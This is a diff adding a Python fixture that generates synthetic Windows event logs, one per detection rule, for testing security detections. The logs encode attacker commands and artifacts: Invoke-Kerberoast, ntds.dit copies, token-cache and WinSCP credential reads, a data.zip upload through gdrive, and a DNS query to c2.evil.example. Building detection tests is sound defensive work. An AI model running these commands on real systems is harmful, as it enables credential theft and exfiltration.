@@ -389,6 +389,235 @@ def build() -> list[dict[str, Any]]:
     typed = "Get-LocalGroupMember -Name Administrators"
     details = "\tUserId=CORP\\alice\r\n\tHostName=ConsoleHost\r\n\tScriptName=\r\n\tCommandLine=" + typed
     rows.append(ev(800, ps_classic, {"Data": [typed, details, 'CommandInvocation(Get-LocalGroupMember): "Get-LocalGroupMember"']}, pst + 20_000))
+    rows += technique_gaps(t + 400_000)
+    return rows
+
+
+def technique_gaps(t: int) -> list[dict[str, Any]]:
+    """One sample per rule of rules/windows/technique-gaps.yaml."""
+    ps = lambda text, ts: ev(4104, PS, {"ScriptBlockText": text, "Path": ""}, ts)  # noqa: E731
+    reg = r"C:\Windows\System32\reg.exe"
+    rows = [
+        sysmon(22, {"Image": r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe", "QueryName": "c2.evil.example", "QueryStatus": "0"}, t),
+        sysmon(11, {"Image": r"C:\Users\Public\bk.exe", "TargetFilename": r"\\?\Volume{1}\EFI\Boot\bootx64.efi"}, t + 1000),
+        ev(
+            5136,
+            SEC,
+            {
+                "SubjectUserName": "alice",
+                "SubjectDomainName": "CORP",
+                "ObjectDN": "cn={F12AD28C-02E9-42B4-A0A7-6E89C066B65F},cn=policies,cn=system,DC=corp,DC=local",
+                "ObjectClass": "groupPolicyContainer",
+                "AttributeLDAPDisplayName": "flags",
+                "AttributeValue": "3",
+                "OperationType": "%%14674",
+            },
+            t + 2000,
+            computer="DC01",
+        ),
+        sysmon(
+            13,
+            {"EventType": "SetValue", "Image": reg, "TargetObject": r"HKLM\System\CurrentControlSet\Control\Lsa\RunAsPPL", "Details": "DWORD (0x00000000)"},
+            t + 3000,
+        ),
+        sysmon(
+            1,
+            {"Image": r"C:\Windows \System32\mmc.exe", "CommandLine": r'"C:\Windows \System32\mmc.exe" WmiMgmt.msc', "ParentImage": r"C:\Windows\explorer.exe"},
+            t + 4000,
+        ),
+        ps("([adsisearcher]'(objectcategory=group)').FindAll()", t + 5000),
+        ps("Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation", t + 6000),
+        sysmon(11, {"Image": r"C:\Python312\python.exe", "TargetFilename": r"C:\Python312\Lib\site-packages\sitecustomize.py"}, t + 7000),
+        ps("Set-ADUser -Identity bob -Add @{msPKIAccountCredentials=$blob}", t + 8000),
+        sysmon(
+            13,
+            {
+                "EventType": "SetValue",
+                "Image": reg,
+                "TargetObject": r"HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist\1",
+                "Details": "abcdefgh;https://evil.example/u",
+            },
+            t + 9000,
+        ),
+        sysmon(
+            13,
+            {"EventType": "SetValue", "Image": reg, "TargetObject": r"HKLM\SOFTWARE\Policies\Google\Update\UpdateDefault", "Details": "DWORD (0x00000000)"},
+            t + 10_000,
+        ),
+        ev(
+            4781,
+            SEC,
+            {
+                "OldTargetUserName": "Administrator",
+                "NewTargetUserName": "support",
+                "TargetDomainName": "WS01",
+                "TargetSid": "S-1-5-21-1-2-3-500",
+                "SubjectUserName": "alice",
+                "SubjectDomainName": "CORP",
+            },
+            t + 11_000,
+        ),
+        sysmon(
+            1,
+            {"Image": r"C:\Users\alice\gdrive.exe", "CommandLine": r'"C:\Users\alice\gdrive.exe" --refresh-token 1//0abc files upload C:\Temp\data.zip'},
+            t + 12_000,
+        ),
+        ev(
+            4663,
+            SEC,
+            {
+                "SubjectUserName": "alice",
+                "ObjectType": "File",
+                "ObjectName": r"C:\Users\alice\.azure\msal_token_cache.json",
+                "ProcessName": r"C:\Users\Public\s.exe",
+                "AccessMask": "0x1",
+            },
+            t + 13_000,
+        ),
+        proc(r"C:\Windows\System32\cmd.exe", 'cmd /c "%APPDATA:~-10,1%%PROGRAMFILES:~8,1%%TMP:~-8,1%"', ts=t + 14_000),
+        proc(r"C:\Windows\System32\cmd.exe", 'cmd /c ip""con""fig /all', ts=t + 15_000),
+        sysmon(1, {"Image": r"C:\Users\alice\AppData\Local\Microsoft\WindowsApps\Get-Variable.exe", "CommandLine": "Get-Variable.exe Name host"}, t + 16_000),
+        sysmon(11, {"Image": r"C:\Users\alice\Desktop\dControl.exe", "TargetFilename": r"C:\Users\alice\Desktop\DefenderControl.ini"}, t + 17_000),
+        proc(r"C:\Windows\System32\cmd.exe", r"cmd /c ftype txtfile=C:\Users\Public\evil.exe %1", ts=t + 18_000),
+        proc(r"C:\Windows\System32\fsutil.exe", "fsutil behavior set SymlinkEvaluation R2L:1 R2R:1", ts=t + 19_000),
+        ev(
+            5145,
+            SEC,
+            {
+                "SubjectUserName": "admin",
+                "SubjectDomainName": "CORP",
+                "ObjectType": "File",
+                "IpAddress": "10.0.0.66",
+                "IpPort": "50123",
+                "ShareName": "\\\\*\\ADMIN$",
+                "ShareLocalPath": "\\??\\C:\\Windows",
+                "RelativeTargetName": "__1788255000.123",
+                "AccessMask": "0x2",
+            },
+            t + 20_000,
+        ),
+        ev(
+            4768,
+            SEC,
+            {
+                "TargetUserName": "bob",
+                "TargetDomainName": "CORP",
+                "ServiceName": "krbtgt",
+                "TicketOptions": "0x40800010",
+                "Status": "0x0",
+                "TicketEncryptionType": "0x17",
+                "PreAuthType": "2",
+                "IpAddress": "::ffff:10.0.0.78",
+                "IpPort": "50001",
+            },
+            t + 21_000,
+            computer="DC01",
+        ),
+        ev(
+            4769,
+            SEC,
+            {
+                "TargetUserName": "bob@CORP.LOCAL",
+                "TargetDomainName": "CORP.LOCAL",
+                "ServiceName": "SRV01$",
+                "TicketOptions": "0x40810000",
+                "TicketEncryptionType": "0x17",
+                "IpAddress": "::ffff:10.0.0.78",
+                "IpPort": "50002",
+                "Status": "0x0",
+            },
+            t + 22_000,
+            computer="DC01",
+        ),
+        sysmon(11, {"Image": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "TargetFilename": r"C:\Temp\bob.pst"}, t + 23_000),
+        sysmon(
+            1,
+            {
+                "Image": r"C:\Windows\System32\msdtc.exe",
+                "CommandLine": "msdtc.exe -a",
+                "ParentImage": r"C:\ProgramData\MSB\msbtc.exe",
+                "ParentCommandLine": r"C:\ProgramData\MSB\msbtc.exe",
+            },
+            t + 24_000,
+        ),
+        sysmon(
+            7,
+            {"Image": r"C:\Users\alice\AppData\Roaming\Corp\client32.exe", "ImageLoaded": r"C:\Users\alice\AppData\Roaming\Corp\PCICL32.DLL", "Signed": "true"},
+            t + 25_000,
+        ),
+        sysmon(1, {"Image": r"C:\Users\alice\Downloads\fscan64.exe", "CommandLine": "fscan64.exe -h 10.0.0.0/24"}, t + 26_000),
+        sysmon(
+            11, {"Image": r"C:\Program Files\Mozilla Firefox\firefox.exe", "TargetFilename": r"C:\Users\alice\Downloads\WebBrowserPassView.zip"}, t + 27_000
+        ),
+        sysmon(11, {"Image": r"C:\Windows\System32\ntdsutil.exe", "TargetFilename": r"C:\$SNAP_202609010850_VOLUMEC$\Windows\NTDS\ntds.dit"}, t + 28_000),
+        sysmon(1, {"Image": r"C:\Program Files\Wireshark\dumpcap.exe", "CommandLine": r"dumpcap -i 1 -w C:\Temp\c.pcapng"}, t + 29_000),
+        ps("Import-Module .\\PowerUp.ps1; Invoke-AllChecks", t + 30_000),
+        ps("Invoke-Kerberoast -OutputFormat Hashcat", t + 31_000),
+        ps("Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value '10.0.0.9' -Force", t + 32_000),
+        sysmon(
+            13,
+            {"EventType": "SetValue", "Image": reg, "TargetObject": r"HKU\S-1-5-21-1-2-3-1104\Environment\PYTHONPATH", "Details": r"C:\Users\Public\py"},
+            t + 33_000,
+        ),
+        sysmon(1, {"Image": r"C:\Windows\System32\mmc.exe", "CommandLine": r'"C:\Windows\system32\mmc.exe" compmgmt.msc /computer:10.0.0.15'}, t + 34_000),
+        sysmon(
+            13,
+            {
+                "EventType": "SetValue",
+                "Image": reg,
+                "TargetObject": r"HKLM\System\CurrentControlSet\Services\RemoteAccess\RouterManagers\Ip\DllPath",
+                "Details": r"C:\Users\Public\r.dll",
+            },
+            t + 35_000,
+        ),
+        ev(
+            4663,
+            SEC,
+            {
+                "SubjectUserName": "alice",
+                "ObjectType": "Key",
+                "ObjectName": r"\REGISTRY\USER\S-1-5-21-1-2-3-1104\Software\Martin Prikryl\WinSCP 2\Sessions\srv",
+                "ProcessName": r"C:\Users\Public\s.exe",
+                "AccessMask": "0x1",
+            },
+            t + 36_000,
+        ),
+    ]
+    # one client asks tickets for 25 computers; 15 inbound RDP connections from one address
+    for i in range(25):
+        rows.append(
+            ev(
+                4769,
+                SEC,
+                {
+                    "TargetUserName": "carol@CORP.LOCAL",
+                    "ServiceName": f"WS{i:02d}$",
+                    "TicketOptions": "0x40810000",
+                    "TicketEncryptionType": "0x12",
+                    "IpAddress": "::ffff:10.0.0.77",
+                    "IpPort": "50010",
+                    "Status": "0x0",
+                },
+                t + 40_000 + i * 1000,
+                computer="DC01",
+            )
+        )
+    for i in range(15):
+        rows.append(
+            sysmon(
+                3,
+                {
+                    "Image": r"C:\Windows\System32\svchost.exe",
+                    "Protocol": "tcp",
+                    "Initiated": "false",
+                    "SourceIp": "203.0.113.50",
+                    "SourcePort": 40000 + i,
+                    "DestinationIp": "10.0.0.5",
+                    "DestinationPort": 3389,
+                },
+                t + 70_000 + i * 2000,
+            )
+        )
     return rows
 
 
